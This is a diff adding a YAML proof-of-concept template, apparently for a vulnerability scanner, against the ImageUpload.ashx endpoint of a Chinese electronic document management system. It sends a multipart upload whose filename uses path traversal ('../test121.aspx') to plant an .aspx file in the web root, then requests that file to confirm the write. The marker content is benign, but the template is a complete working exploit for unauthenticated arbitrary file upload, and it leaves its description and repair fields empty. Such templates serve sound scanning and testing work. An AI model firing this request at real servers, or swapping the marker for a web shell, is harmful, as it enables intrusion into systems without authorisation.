@@ -1,0 +1,42 @@
+id:
+
+info:
+  name: 电子资料管理系统 ImageUpload.ashx 文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /Menu/ImageManger/ImageUpload.ashx
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Upgrade-Insecure-Requests: 1
+    Accept-Encoding: gzip
+  data: |
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="isUpload"
+
+    印章图片
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="entid"
+
+    666
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="Type"
+
+    1
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="Filedata"; filename="../test121.aspx"
+    Content-Type: text/plain
+
+    123456
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+response1:
+requests2:
+  method: GET
+  path: /test121.aspx
+response2:
+  body: 123456
+  code: 200
